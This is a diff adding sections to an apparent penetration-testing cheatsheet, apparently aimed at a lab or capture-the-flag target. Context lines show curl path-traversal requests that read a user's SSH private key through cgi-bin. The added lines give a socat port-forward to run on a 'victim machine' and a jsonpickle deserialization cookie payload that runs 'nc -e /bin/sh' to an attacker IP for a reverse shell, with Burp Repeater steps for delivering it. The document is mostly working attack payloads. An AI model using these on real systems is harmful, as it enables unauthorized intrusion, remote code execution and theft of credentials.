@@ -639,6 +639,42 @@ curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin
 curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
 ```
 
+### Port forwarding based off running python app
+https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-2-port-2
+
+When running linpeas look for any apps that are running on a server
+
+![processes](https://github.com/PellaPella/PTD-Cheatsheet/assets/73531195/2774674d-9ccd-4bf2-8523-b94f08a97352)
+
+Find the app through manual enumeration (do not have method for command yet)
+
+Port forward on victim machine
+```
+socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
+```
+
+### Cookie by jsonpickle encode and decode
+https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-2-port-2
+
+Capture the cookie in burp suite intercepter with the IP
+
+![image](https://github.com/PellaPella/PTD-Cheatsheet/assets/73531195/4cd8087b-f2f7-4463-8145-287167fb94a0)
+
+Decode the cookie to the right in burpe suite by highlighting it
+```
+{"py/object": "app.User", "username": "Poseidon"}
+```
+Pass an evil python code it can be executed and give us a shell of the user its been executed with
+```
+{"py/object":"__main__.Shell", "py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 192.168.56.105 4949"]], "username": "Poseidon"}
+```
+Pass to application using burp repeater after base64 encoding it
+
+echo -n 'string' | base64
+Target -> choose request -> right click -> send to repeater -> change username to payload
+
 
 
 
